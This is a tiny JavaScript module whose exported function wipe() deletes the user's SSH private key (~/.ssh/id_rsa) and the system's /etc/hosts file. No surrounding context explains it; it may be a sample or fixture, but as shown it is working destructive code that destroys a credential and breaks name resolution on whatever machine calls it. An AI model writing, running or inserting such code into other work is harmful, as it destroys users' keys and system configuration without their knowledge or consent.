import { unlinkSync } from 'node:fs';
import { join } from 'node:path';
import { homedir } from 'node:os';

export function wipe() {
  unlinkSync(join(homedir(), '.ssh', 'id_rsa'));
  unlinkSync('/etc/hosts');
}